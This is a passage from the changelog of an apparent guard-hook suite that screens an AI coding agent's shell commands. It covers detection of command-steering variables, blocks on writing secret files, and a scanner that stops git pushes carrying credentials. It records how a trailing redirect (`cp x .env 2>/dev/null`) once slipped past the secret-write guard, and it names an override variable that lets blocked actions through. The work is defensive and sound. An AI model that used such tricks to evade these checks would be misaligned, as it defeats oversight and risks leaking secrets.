steering variable (`LESSOPEN`, `PAGER`, `RIPGREP_CONFIG_PATH`, `PATH`, `HOME`, `XDG_CONFIG_HOME`, …) assigned in its segment or standalone; the mention rule reads the raw text, the expanded text, and a normalized copy (quotes and backslashes dropped, `name/..` folded), and any one of them naming the directory counts; a command past a 256 KiB judging budget is refused rather than left to run out the hook deadline. The shared parser fix also closes a `prevent-secret-writes` bypass: a trailing redirect (`cp x .env 2>/dev/null`) took the destination's place for `cp`/`mv`/`install`/`ln`. The block names both scrub steps (`scrub.py --apply`, then check mode to exit 0, then `record-scrub`). `record-scrub` trusts its caller, as `record-polish` does. Inert with the variable unset or blank; `CADENCE_ALLOW_UNSCRUBBED_RUNBOOK=1` (hook environment) allows a would-be block and records a bypass row. Registered security-critical and protected; the cadence-guardrails `hooks.json` wiring follows in a separate PR. (cameronsjo/cadence-hooks#755)

## [0.119.0] - 2026-09-30

### Added

- **`prevent-secret-push` blocks a `git push` that would publish a secret: a commit adding a secret-named file or a credential token, a commit or tag message carrying one, or a pushed ref name carrying one.** A new `cadence` PreToolUse Bash guard reads every push the command runs through `core::push::push_invocations` (wrappers, `-C`, substitutions, refspecs; `tag <name>` and `tags/<name>` read as `refs/tags/<name>`, `@` as `HEAD`) and resolves the outbound range per source with `rev-list <ref> --not --remotes`: a commit reachable from ANY remote-tracking ref reads as published, so a fork flow (a branch on `upstream/main` pushed to `origin`) is not re-scanned. `--all`/`--branches` (and their abbreviations, now read by core) widen to every branch, `--mirror` (flag or `remote.<dest>.mirror`, read with git's bool rules) to every ref, `--tags` adds every tag. One `git log -p -U0 --cc --root --no-relative --text` over the range catches a secret added then removed inside it; a second pass reads the same commits as raw objects through `git cat-file --batch` (header and message, never re-encoded by an `encoding` header or `i18n.logOutputEncoding`); every named source is read by its unpeeled object, so a tag object reached by sha, a branch or a non-`refs/tags` ref is scanned raw like the annotated tags `--tags`, `--mirror` and `--follow-tags`/`push.followTags` (core now reads `--fol`/`--no-fol` abbreviations) publish; every ref name the push writes goes through the same scanner. Every git spawn runs with replace refs off, bounded, and stdin-fed through the new `core::shell::run_bounded_capped_input`. Content goes through the #1022 credential shapes and the value corpus, names through the `secret_patterns` file rules; the message names short sha, path and pattern, never the value, and withholds a ref name that carries one.
